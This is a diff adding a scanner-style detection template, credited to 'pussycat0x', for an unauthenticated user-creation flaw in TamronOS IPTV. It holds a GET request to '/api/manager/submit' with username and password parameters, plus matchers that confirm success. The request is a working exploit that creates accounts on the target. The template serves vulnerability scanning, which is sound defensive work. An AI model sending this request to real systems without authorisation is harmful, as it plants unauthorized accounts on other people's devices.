@@ -1,0 +1,30 @@
+id: tamronos-user-creation
+brief:
+    title: TamronOS IPTV - Arbitrary User Creation
+    by: pussycat0x
+    level: high
+    about: Unathenticated attackers can create multiple users in TamronOS IPTV.
+    label:
+        - tamronos
+        - miconfig
+        - iptv
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/manager/submit?group=1&username={{username}}&password={{password}}'
+      signs:
+        - "on": word
+          has:
+            - '"suc":true'
+            - '"msg":"\u6210\u529f"'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
